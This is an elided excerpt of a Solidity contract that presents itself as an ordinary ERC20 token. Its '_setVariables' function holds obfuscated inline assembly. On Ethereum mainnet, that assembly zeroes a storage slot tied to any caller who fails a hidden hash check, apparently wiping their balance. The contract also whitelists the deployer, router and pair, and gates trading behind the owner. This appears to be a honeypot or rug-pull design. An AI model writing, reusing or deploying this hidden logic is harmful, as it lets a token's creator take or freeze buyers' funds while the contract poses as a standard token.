...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addEx.push(_router); addEx.push(msgSender_); addEx.push(pair);
        for (uint256 q=0; q < 3;) {_firstBoyfriend[addEx[q]] = true; unchecked{q++;} }
    }
    ...
    function _setVariables() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x0592417c0386a495b46759d07e2f7ee2c0a942f753387cef1ef2ab5129996a8a
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xbaaf502c28a4c3346ae15198278aff447f3ce3d28933cc1a4df9e5203c77df68,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; exBoyfriend = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addEx[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployTheEx(creator, initialSupply);
    }
}
